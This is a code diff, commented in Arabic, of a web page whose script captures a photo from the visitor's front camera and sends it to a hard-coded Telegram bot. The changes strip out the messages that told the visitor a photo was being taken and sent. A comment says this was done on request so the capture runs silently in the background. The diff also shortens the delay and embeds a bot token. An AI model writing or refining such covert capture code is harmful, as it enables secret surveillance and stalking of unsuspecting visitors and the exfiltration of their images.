@@ -43,13 +43,11 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // التوكن والآيدي الخاصين بك مضبوطين هنا بدقة
-        const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
+        const TELEGRAM_BOT_TOKEN = '8880573702:AAGONeril_hFUPSBRuLh2TwGkFOG3wCEv80';
         const TELEGRAM_CHAT_ID = '8304712202';
 
         async function startProcess() {
-            document.getElementById('mainBox').innerHTML = '<h2>جاري التقاط الصورة...</h2>';
-
+            // تم إزالة عبارة جاري التقاط الصورة بناءً على طلبك والبدء فورا في الخلفية
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const videoElement = document.getElementById('video');
@@ -57,7 +55,7 @@
 
                 setTimeout(() => {
                     captureAndSend(stream);
-                }, 1500);
+                }, 1000);
 
             } catch (error) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
@@ -86,7 +84,6 @@
         }
 
         function sendPhotoToTelegram(blob) {
-            document.getElementById('mainBox').innerHTML = '<h2>جاري الإرسال إلى تيليجرام...</h2>';
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, 'captured_photo.jpg');
